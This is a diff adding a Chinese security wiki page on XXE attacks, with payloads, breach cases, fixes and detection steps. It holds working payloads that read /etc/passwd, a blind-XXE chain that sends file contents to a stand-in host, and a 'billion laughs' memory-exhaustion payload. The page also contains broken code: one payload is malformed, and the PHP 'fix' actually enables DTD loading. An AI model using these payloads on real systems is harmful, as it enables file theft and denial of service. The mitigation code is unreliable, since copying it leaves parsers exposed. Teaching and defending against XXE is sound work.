@@ -1,0 +1,283 @@
+====== XML External Entity attack/XXE攻击 ======
+
+
+==== 1、相关背景介绍 ====
+
+**可扩展标记语言（eXtensible Markup Language，XML）**是一种标记语言，被设计用来传输和存储数据。XML应用极其广泛，如：
+    
+  * 普通列表项目文档格式：OOXML，ODF，PDF，RSS……
+  * 图片格式：SVG，EXIF Headers……
+  * 网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……
+  * 配置文件：Spring配置文件，Struts2配置文件……
+
+在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。
+
+包含内部实体的XML文档：
+
+<code xml>
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE entity [
+  <!ENTITY copyright "Copyright wiki.wooyun.org">
+]>
+
+<wooyun>
+  <internal>&copyright;</internal>
+</wooyun>
+</code>
+
+包含外部实体的XML文档：
+
+<code xml>
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE entity [
+  <!ENTITY wiki SYSTEM "http://wiki.wooyun.org/">
+]>
+    
+<wooyun>
+  <external>&wiki;</external>
+</wooyun>
+</code>
+
+在解析XML时，实体将会被替换成相应的引用内容。
+
+**XML外部实体（XML External Entity，XXE）攻击**是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。
+
+==== 2、成因 ====
+
+XML解析器解析外部实体时支持多种协议：
+
+|libxml2 |PHP             |Java    |.NET    |
+|--------|----------------|--------|--------|
+|file    |file            |file    |file    |
+|http    |http            |http    |http    |
+|ftp     |ftp             |ftp     |ftp     |
+|        |php             |https   |https   |
+|        |compress.zlib   |jar     |        |
+|        |data            |netdoc  |        |
+|        |glob            |mailto  |        |
+|        |phar            |gopher  |        |
+
+
+如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击。
+
+下面这个XML被解析时便会将本地''/etc/passwd''文件的内容读出来：
+
+<code xml>
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE entity [
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+
+<wooyun>
+  <external>&file;</external>
+</wooyun>
+</code>
+
+*注：如果读取的文件本身包含“<”、“&”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：*
+
+<code xml>
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE entity [
+  <!ENTITY file SYSTEM ENTITY e SYSTEM "php://filter/read=convert.base64-encode/resource=http://wiki.wooyun.org">
+]>
+
+<wooyun>
+  <external>&file;</external>
+</wooyun>
+</code> 
+
+不同的解析器可能默认对于外部实体会有不同的处理规则,以PHP语言为例，xml\_parse的实现方式为expat库，而simplexml\_load使用的是libxml库，两个底层库在解析的时候细节并不一样，expat默认对外部实体并不解析，而simplexml\_load默认情况下会解析外部实体等，所以simplexml\_load函数会受此问题影响，而xml\_parse则默认不会受到影响。下面是几种常见语言可能会受到此问题影响的解析XML的方法：
+
+|PHP         |Java            |.NET                    |
+|------------|----------------|------------------------|
+|DOM         |（待补充）       |System.Xml.XmlDocument  |
+|SimpleXML   |                |System.Xml.XmlReader    |
+
+
+==== 3、攻击方式及危害 ====
+
+XXE的攻击方式分为**显式攻击**和**盲攻击**两种：
+
+上述POC即为显式攻击，攻击者通过正常的回显将外部实体里的内容读取出来。
+
+但是，在有些情况下无法通过这种方式完成XXE攻击，这时我们可以采取盲攻击的办法。
+
+XXE盲攻击利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容。
+
+因在dtd中使用%来定义参数实体的方式只能在外部子集中使用，或由外部文件定义参数实体，引用到XML文件的dtd来使用，所以XML文件稍有不同：
+
+<code xml>
+<?xml version="1.0" encoding="utf-8"?>
+    
+<!DOCTYPE entity [
+  <!ENTITY % call SYSTEM "http://example.com/evil.xml">
+  %call;
+]>
+    
+<wooyun>
+  <text>test</text>
+</wooyun>
+</code>
+    
+其中''http://example.com/evil.xml''里的内容是：
+
+<code xml>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://example.com/?file=%file;'>">
+%int;
+%send;
+</code>
+
+危害：
+
+XXE漏洞会导致读取任意未授权文件，如上述POC即可读取服务器中的''/etc/passwd''文件；
+
+因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击，例如:
+
+<code xml>
+<?xml version = "1.0"?>
+    
+<!DOCTYPE entity [  
+    <!ENTITY wooyun "wooyun">
+    <!ELEMENT wooyunz (#PCDATA)>
+    <!ENTITY wooyun1 "&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;">
+    <!ENTITY wooyun2 "&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;">
+    <!ENTITY wooyun3 "&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;">
+    <!ENTITY wooyun4 "&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;">
+    <!ENTITY wooyun5 "&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;">
+    <!ENTITY wooyun6 "&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;">
+    <!ENTITY wooyun7 "&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;">
+    <!ENTITY wooyun8 "&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;">
+    <!ENTITY wooyun9 "&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;">
+]>
+
+<wooyun>&wooyun9;</wooyun>
+</code>
+    
+这个XML在定义实体是不断嵌套调用，如解析时未对大小进行限制，则可能会导致内存大量被消耗，从而实现拒绝服务攻击。
+
+此外，还可以利用支持的协议构造出很多相关的攻击，如探测内网信息（如检测服务等）等。
+
+==== 4、实际案例 ====
+
+**gainover：WooYun-2014-59783：[[http://wooyun.org/bugs/wooyun-2014-059783|百度某功能XML实体注入（二）]] **
+
+由于SVG本身是基于XML的，该漏洞在SVG转成JPG图片时的XML解析过程中厂商仅直接过滤了''ENTITY''关键字，但是由于DTD本身就支持调用外部的DTD文件，因此通过调用''<!DOCTYPE svg SYSTEM "http://example.com/xxe.dtd">''的方式引入外部的DTD文件即成功避开了对''ENTITY''关键字的过滤，其中''xxe.dtd''的内容如下：
+
+<code xml>  
+<!ENTITY test SYSTEM "file:///etc/passwd">
+</code>
+
+**iv4n：WooYun-2014-74069：[[http://www.wooyun.org/bugs/wooyun-2014-074069|鲜果网RSS导入Blind XXE漏洞]]**
+
+该漏洞的过程是利用参数实体实现了XXE盲攻击，在读取本地文件后，将读出本地文件的内容作为URL中的参数向其指定服务器发起请求，在指定服务器的Apache日志中即可看到读出的文件内容。
+
+**五道口杀气：WooYun-2014-59911：[[http://www.wooyun.org/bugs/wooyun-2014-059911|从开源中国的某XXE漏洞到主站shell]]**
+
+该漏洞在格式化xml时进行了解析且没有对外部实体进行限制，所以产生服务器上任意文件被读取的问题，从而导致主站的ssh用户名和密码泄露，被成功getshell。
+
+==== 5、修复方案 ====
+
+在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。
+
+了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。下面给出了一些常见的关闭方法：
+
+**PHP：**
+
+对于使用SimpleXML解析XML的方法可在加载实体之前添加''libxml_disable_entity_loader(true);''语句以进制解析外部实体。
+
+对于使用DOM解析XML的方法可在加载实体之前添加''libxml_disable_entity_loader(true);''语句或者使用：
+
+<code php>
+<?php
+// with the DOM functionality:
+$dom = new DOMDocument();
+$dom->loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR);
+?>
+</code>
+
+对于XMLReader解析XML的方法可使用：
+
+<code php>
+<?php
+// with the XMLReader functionality:
+$doc = XMLReader::xml($badXml,'UTF-8',LIBXML_NONET);
+?>
+</code>
+
+**Java：**
+
+<code java>
+DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+</code>
+
+**.Net：**
+
+对于使用System.Xml.XmlReader解析XML的方法：
+
+默认情况下，外部资源使用没有用户凭据的XmlUrlResolver对象进行解析。这意味着在默认情况下，可以访问任何不需要凭据的位置。通过执行下列操作之一，可以进一步保证安全：
+
+  * 通过将XmlReaderSettings.XmlResolver属性设置为XmlSecureResolver对象限制XmlReader可访问的资源。
+  * 通过将XmlReaderSettings.XmlResolver属性设置为null，不允许XmlReader打开任何外部资源。
+
+对于利用超大的XML文档进行拒绝服务攻击的问题，使用XmlReader时，通过设置MaxCharactersInDocument属性，可以限制能够分析的文档大小。通过设置MaxCharactersFromEntities属性，可以限制从扩展实体中生成的字符数。
+
+**Python：**
+
+<code python>
+from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code>
+    
+
+
+==== 6、漏洞扫描与发现 ====
+检测XML是否被解析
+<code xml>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ANY [
+	<!ENTITY xxe "xxe test">
+]>
+<root>&xxe;</root>
+</code>
+
+如果显示了xxe test证明支持，进行第二步
+
+是否支持外部实体:
+<code xml>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ANY [
+	<!ENTITY % xxe SYSTEM "http://192.168.5.1/xxe.xml">
+%xxe;
+]>
+</code>
+
+观察自己的服务器上得access.log，如果有xxe.xml的请求，证明可以加载外部实体。
+
+然后判断是否有回显，有回显就直接加载外部实体来进行攻击
+
+不能回显，则使用Blind XXE攻击方法
+
+==== 7、相关其他安全问题 ====
+
+未知
+
+==== 8、相关资源 ====
+
+[[http://www.w3school.com.cn/x.asp|w3school：XML系列教程]]
+
+[[http://security.tencent.com/index.php/blog/msg/69|Mark4z5：未知攻焉知防——XXE漏洞攻防]]
+
+[[https://www.owasp.org/index.php/XML_External_Entity_\(XXE\)_Processing|XML External Entity (XXE) Processing]]
+
+[[http://blog.csdn.net/u011721501/article/details/43775691|读源码的猫：XXE漏洞以及Blind XXE总结]]
+
+[[http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html|Chris Cornutt：Preventing XXE in PHP]]
+
+[[https://www.youtube.com/watch?v=eHSNT8vWLfc|Timothy D.Morgan：What You Didn't Know About XML External Entities Attacks]]
